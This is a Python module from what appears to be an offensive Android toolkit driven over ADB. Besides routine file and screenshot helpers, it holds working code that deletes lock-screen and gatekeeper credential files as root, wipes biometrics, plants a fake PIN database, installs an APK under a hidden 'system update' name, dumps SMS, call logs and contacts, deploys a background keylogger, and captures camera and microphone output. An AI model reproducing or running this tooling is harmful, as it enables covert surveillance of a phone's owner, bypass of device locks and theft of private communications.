import subprocess
import os
import datetime
import time
import re
from core.utils.logger import logger
from config import Colors

# Remove circular import - we'll get device from function parameters instead
# from core.adb.device_manager import DeviceManager
# dm = DeviceManager()

REDL = "\033[91m"
GNSL = "\033[92m"
ENDL = "\033[0m"


def get_current_device():
    """Get the current connected device"""
    try:
        result = subprocess.run(
            ["adb", "devices"], capture_output=True, text=True)
        devices = []
        for line in result.stdout.splitlines()[1:]:
            if line.strip() and 'device' in line and 'offline' not in line:
                devices.append(line.split()[0])

        if devices:
            return devices[0]  # Return first available device
        return None
    except Exception:
        return None


def pull_file():
    device = get_current_device()
    if not device:
        print("No device connected.")
        return
    remote = input("Remote path on device: ")
    local = input("Local path to save file: ")
    cmd = ["adb", "-s", device, "pull", remote, local]
    subprocess.run(cmd)


def push_file():
    device = get_current_device()
    if not device:
        print("No device connected.")
        return
    local = input("Local file path: ")
    remote = input("Remote path on device: ")
    cmd = ["adb", "-s", device, "push", local, remote]
    subprocess.run(cmd)


def screen_record():
    device = get_current_device()
    out_file = "/sdcard/screen.mp4"
    cmd = ["adb", "-s", device] if device else ["adb"]
    cmd += ["shell", "screenrecord", out_file]
    print("Recording... CTRL+C to stop.")
    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print("\nRecording stopped.")
        subprocess.run(
            (["adb", "-s", device] if device else ["adb"]) + ["pull", out_file, "."])


def screenshot():
    device = get_current_device()
    remote = "/sdcard/screen.png"
    cmd_base = ["adb", "-s", device] if device else ["adb"]
    subprocess.run(cmd_base + ["shell", "screencap", "-p", remote])
    subprocess.run(cmd_base + ["pull", remote, "."])


def check_device_ready(device_id):
    try:
        result = subprocess.check_output(["adb", "devices"]).decode()
        if device_id not in result:
            print(REDL + "[!] Device not connected or not detected.")
            return False

        auth_check = subprocess.check_output(
            ["adb", "-s", device_id, "shell", "echo", "auth_test"]).decode().strip()
        if "auth_test" not in auth_check:
            print(REDL + "[!] ADB not authorized. Check phone screen.")
            return False

        su_check = subprocess.check_output(
            ["adb", "-s", device_id, "shell", "su", "-c", "whoami"]).decode().strip()
        if "root" not in su_check:
            print(REDL + "[!] Root access not available.")
            return False

        return True
    except Exception as e:
        print(REDL + f"[!] Pre-check failed: {e}")
        return False


def relock_with_fake_pin(device_id):
    print(GNSL + "[*] Re-locking device with fake 1234 PIN...")

    fake_db_path = "./fake_lock/locksettings.db"
    remote_path = "/data/system/locksettings.db"

    push_cmd = f"adb -s {device_id} push {fake_db_path} {remote_path}"
    chmod_cmd = f"adb -s {device_id} shell su 0 'chmod 600 {remote_path}'"

    os.system(push_cmd)
    os.system(chmod_cmd)

    print(GNSL + "[+] Fake PIN pushed and permissions set.")


def remove_password(device_id):
    print(REDL + "****************** REMOVING PASSWORD ******************")

    # Backup lockscreen data before removal
    backup_lockscreen_data(device_id)

    files_to_remove = [
        "/data/system/gesture.key",
        "/data/system/locksettings.db",
        "/data/system/locksettings.db-wal",
        "/data/system/locksettings.db-shm",
        "/data/system/gatekeeper.password.key",
        "/data/system/gatekeeper.pattern.key",
        "/data/system/gatekeeper.gesture.key",
        "/data/system/synthetic_password/*"
    ]

    for f in files_to_remove:
        cmd = f"adb -s {device_id} shell su 0 'rm -rf {f}'"
        os.system(cmd)

    print(GNSL + "[+] Lock screen credentials wiped.")
    choice = input(GNSL + "Wipe biometrics too? (y/n): ").lower()
    if choice == "y":
        wipe_biometrics(device_id)

    print(REDL + "****************** PASSWORD REMOVED ******************" + ENDL)
    input(ENDL + "ghost" + GNSL + "(main_menu)" + ENDL + "> ")
    if input("Enable stealth mode with fake PIN? (y/n): ").lower() == "y":
        relock_with_fake_pin(device_id)


def wipe_biometrics(device_id):
    print(REDL + "[*] Wiping biometrics and related settings...")

    commands = [
        "rm -rf /data/system/biometric/*",
        "pm clear com.android.settings"
    ]

    for cmd in commands:
        full_cmd = f"adb -s {device_id} shell su 0 '{cmd}'"
        os.system(full_cmd)

    print(GNSL + "[+] Biometric data wiped.")


def get_android_info(device_id):
    try:
        version = subprocess.check_output(
            ["adb", "-s", device_id, "shell", "getprop", "ro.build.version.release"]).decode().strip()
        patch = subprocess.check_output(
            ["adb", "-s", device_id, "shell", "getprop", "ro.build.version.security_patch"]).decode().strip()
        print(GNSL + f"[+] Android Version: {version}")
        print(GNSL + f"[+] Security Patch: {patch}")
    except:
        print(REDL + "[-] Could not get Android version/patch info.")


def reset_security_flow():
    # Get list of connected devices
    try:
        result = subprocess.check_output(
            ["adb", "devices"]).decode().strip().splitlines()
        devices = [line.split()[0]
                   for line in result[1:] if line.strip() and "device" in line]
    except Exception as e:
        print(REDL + f"[!] Failed to list devices: {e}")
        input(REDL + "Press Enter to return to menu.")
        return

    if not devices:
        print(REDL + "[!] No devices connected.")
        input(REDL + "Press Enter to return to menu.")
        return
    elif len(devices) == 1:
        device_id = devices[0]
        print(GNSL + f"[*] Using connected device: {device_id}")
    else:
        print(GNSL + "[*] Connected devices:")
        for idx, dev in enumerate(devices, 1):
            print(f"  [{idx}] {dev}")
        device_id = input("Enter device ID or IP address: ").strip()
        if not device_id:
            print(REDL + "[!] No device selected.")
            input(REDL + "Press Enter to return to menu.")
            return

    get_android_info(device_id)

    if check_device_ready(device_id):
        remove_password(device_id)
    else:
        input(REDL + "[!] Pre-check failed. Press Enter to return to menu.")


def backup_lockscreen_data(device_id):
    backup_dir = f"./backups/{device_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}/"
    os.makedirs(backup_dir, exist_ok=True)

    files = [
        "/data/system/gesture.key",
        "/data/system/locksettings.db",
        "/data/system/locksettings.db-wal",
        "/data/system/locksettings.db-shm",
        "/data/system/gatekeeper.password.key",
        "/data/system/gatekeeper.pattern.key",
        "/data/system/gatekeeper.gesture.key",
    ]

    print(GNSL + "[*] Backing up lockscreen data...")

    for f in files:
        try:
            pull_cmd = f"adb -s {device_id} shell su 0 cat {f} > '{backup_dir}/{os.path.basename(f)}'"
            os.system(pull_cmd)
        except Exception:
            print(REDL + f"[-] Failed to back up: {f}")


def install_apk():
    device = get_current_device()
    if not device:
        print("No device connected.")
        return
    apk_path = input("Local APK path: ")

    cmd = ["adb", "-s", device] if device else ["adb"]
    cmd += ["install", "-r", "-g", apk_path]

    print(GNSL + "[*] Installing APK...")
    subprocess.run(cmd)
    print(GNSL + "[+] APK installed.")


def stealth_apk_install():
    device = get_current_device()
    if not device:
        print("No device connected.")
        return
    apk_path = input("Local APK path: ")
    remote_path = "/data/local/tmp/.sysupdate.apk"

    push_cmd = ["adb", "-s", device] if device else ["adb"]
    push_cmd += ["push", apk_path, remote_path]

    install_cmd = ["adb", "-s", device] if device else ["adb"]
    install_cmd += ["shell", "pm", "install", "-r", remote_path]

    print(GNSL + "[*] Pushing APK...")
    subprocess.run(push_cmd)
    print(GNSL + "[*] Installing via pm...")
    subprocess.run(install_cmd)
    print(GNSL + "[+] Done.")


def uninstall_apk():
    device = get_current_device()
    if not device:
        print("No device connected.")
        return
    package_name = input("Package name to uninstall: ")

    cmd = ["adb", "-s", device] if device else ["adb"]
    cmd += ["uninstall", package_name]

    print(GNSL + "[*] Uninstalling APK...")
    subprocess.run(cmd)
    print(GNSL + "[+] APK uninstalled.")


def dump_sms_messages():
    """Dump SMS messages from device"""
    device = get_current_device()
    if not device:
        logger.error("No device connected.")
        return

    logger.info("Dumping SMS messages...")

    # Try to dump SMS database
    sms_query = "content query --uri content://sms"
    cmd = ["adb", "-s", device, "shell"] + sms_query.split()

    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=30)
        if result.returncode == 0:
            logger.success("SMS data retrieved")
            # Show first 1000 chars
            print(f"{Colors.GREEN}{result.stdout[:1000]}...{Colors.END}")
        else:
            logger.error("Failed to dump SMS messages")
    except Exception as e:
        logger.error(f"SMS dump failed: {str(e)}")


def dump_call_logs():
    """Dump call logs from device"""
    device = get_current_device()
    if not device:
        logger.error("No device connected.")
        return

    logger.info("Dumping call logs...")

    # Try to dump call log
    call_query = "content query --uri content://call_log/calls"
    cmd = ["adb", "-s", device, "shell"] + call_query.split()

    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=30)
        if result.returncode == 0:
            logger.success("Call log data retrieved")
            # Show first 1000 chars
            print(f"{Colors.GREEN}{result.stdout[:1000]}...{Colors.END}")
        else:
            logger.error("Failed to dump call logs")
    except Exception as e:
        logger.error(f"Call log dump failed: {str(e)}")


def dump_contacts():
    """Dump contacts from device"""
    device = get_current_device()
    if not device:
        logger.error("No device connected.")
        return

    logger.info("Dumping contacts...")

    # Try to dump contacts
    contacts_query = "content query --uri content://contacts/people"
    cmd = ["adb", "-s", device, "shell"] + contacts_query.split()

    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=30)
        if result.returncode == 0:
            logger.success("Contacts data retrieved")
            # Show first 1000 chars
            print(f"{Colors.GREEN}{result.stdout[:1000]}...{Colors.END}")
        else:
            logger.error("Failed to dump contacts")
    except Exception as e:
        logger.error(f"Contacts dump failed: {str(e)}")


def keylogger_setup():
    """Set up basic keylogger (requires accessibility service)"""
    device = get_current_device()
    if not device:
        logger.error("No device connected.")
        return

    logger.info("Setting up keylogger...")
    logger.warning("Keylogger requires accessibility service or root access")

    # Basic input event monitoring
    keylog_script = """#!/system/bin/sh
# Basic keylogger script
getevent | grep -E "(KEY_|BTN_)" >> /data/local/tmp/keylog.txt &
"""

    try:
        # Write keylogger script
        with open("temp_keylogger.sh", "w") as f:
            f.write(keylog_script)

        # Push and execute
        subprocess.run(["adb", "-s", device, "push",
                       "temp_keylogger.sh", "/data/local/tmp/keylogger.sh"])
        execute_adb_command(device, "chmod +x /data/local/tmp/keylogger.sh")
        execute_adb_command(
            device, "nohup /data/local/tmp/keylogger.sh &", shell=True)

        logger.success("Keylogger script deployed")
        logger.info("Log file: /data/local/tmp/keylog.txt")

        # Cleanup
        os.unlink("temp_keylogger.sh")

    except Exception as e:
        logger.error(f"Keylogger setup failed: {str(e)}")


def capture_camera():
    """Capture photo from camera without preview"""
    device = get_current_device()
    if not device:
        logger.error("No device connected.")
        return

    logger.info("Capturing camera photo...")

    # Use camera service to capture photo
    capture_cmd = "am start -a android.media.action.IMAGE_CAPTURE"
    cmd = ["adb", "-s", device, "shell"] + capture_cmd.split()

    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=15)
        if result.returncode == 0:
            logger.success("Camera capture initiated")

            # Wait and try to find the captured image
            time.sleep(3)
            find_cmd = "find /sdcard/DCIM/Camera/ -name '*.jpg' | tail -1"
            find_result = subprocess.run(["adb", "-s", device, "shell", find_cmd],
                                         capture_output=True, text=True)

            if find_result.returncode == 0 and find_result.stdout.strip():
                latest_photo = find_result.stdout.strip()
                logger.success(f"Latest photo: {latest_photo}")

                # Pull the photo
                if input("Pull photo to local machine? (y/N): ").lower() == 'y':
                    subprocess.run(
                        ["adb", "-s", device, "pull", latest_photo, "."])
                    logger.success("Photo downloaded")
            else:
                logger.warning("Could not locate captured photo")
        else:
            logger.error("Camera capture failed")
    except Exception as e:
        logger.error(f"Camera capture failed: {str(e)}")


def record_audio():
    """Record audio from microphone"""
    device = get_current_device()
    if not device:
        logger.error("No device connected.")
        return

    logger.info("Starting audio recording...")

    duration = input(
        "Recording duration in seconds (default 10): ").strip() or "10"
    output_file = f"/sdcard/audio_recording_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.3gp"

    # Use mediarecorder to record audio
    record_cmd = f"am start -a android.provider.MediaStore.RECORD_SOUND"

    try:
        # Alternative: use shell command for recording
        record_shell_cmd = f"mediarecorder -audio_input 1 -output_format 2 -audio_encoder 1 -output_file {output_file} -duration {duration}000"

        logger.info(f"Recording audio for {duration} seconds...")
        result = subprocess.run(["adb", "-s", device, "shell", record_shell_cmd],
                                capture_output=True, text=True, timeout=int(duration)+10)

        if result.returncode == 0:
            logger.success(f"Audio recorded: {output_file}")

            if input("Pull audio file? (y/N): ").lower() == 'y':
                subprocess.run(["adb", "-s", device, "pull", output_file, "."])
                logger.success("Audio file downloaded")
        else:
            logger.error("Audio recording failed")

    except Exception as e:
        logger.error(f"Audio recording failed: {str(e)}")


def enable_adb_wifi():
    """Enable ADB over WiFi"""
    device = get_current_device()
    if not device:
        logger.error("No device connected.")
        return

    logger.info("Enabling ADB over WiFi...")

    port = input("Enter port (default 5555): ")

    try:
        # Set TCP port and restart ADB
        commands = [
            f"setprop service.adb.tcp.port {port}",
            "stop adbd",
            "start adbd"
        ]

        for cmd in commands:
            result = subprocess.run(["adb", "-s", device, "shell", "su", "-c", cmd],
                                    capture_output=True, text=True)
            if result.returncode == 0:
                logger.success(f"Executed: {cmd}")
            else:
                logger.warning(f"Command may have failed: {cmd}")

        # Get device IP
        ip_result = subprocess.run(["adb", "-s", device, "shell", "ip", "addr", "show", "wlan0"],
                                   capture_output=True, text=True)

        if ip_result.returncode == 0:
            ip_match = re.search(
                r'inet (\d+\.\d+\.\d+\.\d+)', ip_result.stdout)
            if ip_match:
                device_ip = ip_match.group(1)
                logger.success(f"ADB over WiFi enabled!")
                logger.info(f"Connect with: adb connect {device_ip}:{port}")

    except Exception as e:
        logger.error(f"ADB WiFi setup failed: {str(e)}")


def disable_adb_wifi():
    """Disable ADB over WiFi"""
    device = get_current_device()
    if not device:
        logger.error("No device connected.")
        return

    logger.info("Disabling ADB over WiFi...")

    try:
        commands = [
            "setprop service.adb.tcp.port -1",
            "stop adbd",
            "start adbd"
        ]

        for cmd in commands:
            result = subprocess.run(["adb", "-s", device, "shell", "su", "-c", cmd],
                                    capture_output=True, text=True)
            logger.info(f"Executed: {cmd}")

        logger.success("ADB over WiFi disabled")

    except Exception as e:
        logger.error(f"ADB WiFi disable failed: {str(e)}")


def get_current_activity():
    """Get current foreground activity"""
    device = get_current_device()
    if not device:
        logger.error("No device connected.")
        return

    logger.info("Getting current activity...")

    try:
        # Get current activity
        result = subprocess.run([
            "adb", "-s", device, "shell",
            "dumpsys", "activity", "activities", "|", "grep", "mCurrentFocus"
        ], capture_output=True, text=True)

        if result.returncode == 0:
            logger.success("Current activity retrieved")
            print(f"{Colors.GREEN}{result.stdout.strip()}{Colors.END}")
        else:
            # Alternative method
            alt_result = subprocess.run([
                "adb", "-s", device, "shell",
                "dumpsys", "window", "windows", "|", "grep", "-E", "mCurrentFocus|mFocusedApp"
            ], capture_output=True, text=True)

            if alt_result.returncode == 0:
                logger.success("Current focus retrieved")
                print(f"{Colors.GREEN}{alt_result.stdout.strip()}{Colors.END}")
            else:
                logger.error("Failed to get current activity")

    except Exception as e:
        logger.error(f"Failed to get current activity: {str(e)}")


def shutdown_device():
    """Shutdown the device"""
    device = get_current_device()
    if not device:
        logger.error("No device connected.")
        return

    confirm = input(
        f"{Colors.RED}Are you sure you want to shutdown the device? (y/N): {Colors.END}")
    if confirm.lower() != 'y':
        logger.info("Shutdown cancelled")
        return

    logger.warning("Shutting down device...")

    try:
        # Try different shutdown methods
        shutdown_commands = [
            "reboot -p",
            "shutdown -h now",
            "am start -a android.intent.action.ACTION_REQUEST_SHUTDOWN"
        ]

        for cmd in shutdown_commands:
            try:
                result = subprocess.run(["adb", "-s", device, "shell", "su", "-c", cmd],
                                        capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    logger.success("Shutdown command sent")
                    break
            except subprocess.TimeoutExpired:
                logger.info(
                    "Shutdown initiated (command timed out as expected)")
                break
            except:
                continue

    except Exception as e:
        logger.error(f"Shutdown failed: {str(e)}")


def execute_adb_command(device, command, shell=True):
    """Helper function to execute ADB commands"""
    try:
        if shell:
            cmd = ["adb", "-s", device, "shell"] + command.split()
        else:
            cmd = ["adb", "-s", device] + command.split()

        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=30)
        return result
    except Exception as e:
        logger.error(f"Command execution failed: {str(e)}")
        return None
